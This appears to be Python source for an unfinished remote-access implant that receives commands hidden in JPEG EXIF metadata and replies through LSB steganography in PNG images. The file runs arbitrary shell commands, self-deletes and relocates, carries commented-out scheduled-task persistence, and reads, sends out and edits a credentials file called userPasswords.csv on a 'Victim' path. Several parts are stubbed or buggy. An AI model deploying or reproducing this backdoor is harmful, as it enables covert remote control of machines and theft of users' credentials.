import os
import subprocess
import sys
from csv import writer
from socket import *

import pandas as pd
import piexif
from PIL import Image
from stegano import lsb


def extract_custom_metadata(image_path):
    img = Image.open(image_path)
    exif_dict = piexif.load(img.info['exif'])
    metadata = exif_dict['Exif'][piexif.ExifIFD.MakerNote].decode()
    return metadata


def getCommand(connection_socket: socket):
    with open("temp.jpg", "wb") as img:
        incoming = connection_socket.recv(1024)
        while incoming[-2:] != b'\xff\xD9':
            img.write(incoming)
            incoming = connection_socket.recv(1024)
        img.write(incoming)
    command = extract_custom_metadata("temp.jpg")
    return command.split()


def obfuscateSend(msg: str, connection_socket: socket):  # TODO this at all
    secret = lsb.hide("outface.png", msg)
    secret.save('outface.png')
    with open("outface.png", "rb") as img:
        data = img.read(1024)
        while True:
            if not data:
                break
            connection_socket.sendall(data)
            data = img.read(1024)
    connection_socket.sendall('#####'.encode())


target = r"C:\Users\Victim\Downloads\userPasswords.csv"

# make the program persistant # TODO make this work
# cmd = f"schtasks /create /TR {sys.argv[0]} /SC ONLOGON /tn test"
# os.system(cmd)

implant_socket = socket(AF_INET, SOCK_STREAM)
implant_socket.bind(("0.0.0.0", int(sys.argv[1])))
implant_socket.listen()
connection_socket, client_address = implant_socket.accept()

while True:
    command = getCommand(connection_socket)
    print(command)

    if (command):
        obfuscateSend(f"COMMAND RECEIVED {command[0]}", connection_socket)

    if (command[0] == "0"):  # RECON
        cmd = " ".join(command[1:])
        result = subprocess.check_output(cmd, shell=True)
        if result == b'':
            result = b"empty STDOUT"
        obfuscateSend(result.decode(), connection_socket)
    elif (command[0] == "1"):  # MOVE
        cmd = f"copy implant.py {command[1]}"   # FIXME change name
        result = subprocess.check_output(cmd, shell=True)
        result += ""  # TODO add new presistant schedule
        result += ""  # TODO remove old persistance
        os.remove(sys.argv[0])
        obfuscateSend(result, connection_socket)
        connection_socket.close()
        cmd = f"run {command[1]}"  # FIXME make it run at the new location
        subprocess.check_output(cmd, shell=True)
        exit()
    elif (command[0] == "2"):  # SETPATH
        target = command[1]
        obfuscateSend(f"PATH = {target}", connection_socket)
    elif (command[0] == "3"):  # DESTRUCT
        os.remove(sys.argv[0])
        # TODO make it remove the scedule task
        obfuscateSend("SUCCESSFULLY REMOVED", connection_socket)
        exit()
    elif (command[0] == "4"):  # SLEEP
        pass  # TODO
    elif (command[0] == "5"):  # FETCHALL
        with open(f"{target}", "rb") as file:  # TODO send file
            while True:
                bytes_read = file.read(1024)
                if not bytes_read:
                    break
                connection_socket.sendall(bytes_read)
            file.close()
    elif (command[0] == "6"):  # ADDUSER
        with open(f"{target}", "r") as file:
            last_user_ID = file.readlines()[-1][0]
        new_user = [last_user_ID + 1, command[2], command[3]]
        with open(f"{target}", 'a') as file :
            write_obj = writer(file)
            write_obj.writerow(new_user)
        result = ",".join(new_user)
        obfuscateSend(f"{result} added", connection_socket)
    elif (command[0] == "7"):  # REMOVEUSER
        df = pd.read_csv(f"{target}")
        df_s = df
        df_s = df_s.drop(df_s.query(f'USER_ID=={command[1]}').index)
        df_s.to_csv(f"{target}")
    elif (command[0] == "8"):  # GETUSER
        df = pd.read_csv(f"{target}")
        result = df.loc[df['USER_ID'] == 'yellow']
        obfuscateSend(result, connection_socket)
    else:
        obfuscateSend("!!!", connection_socket)
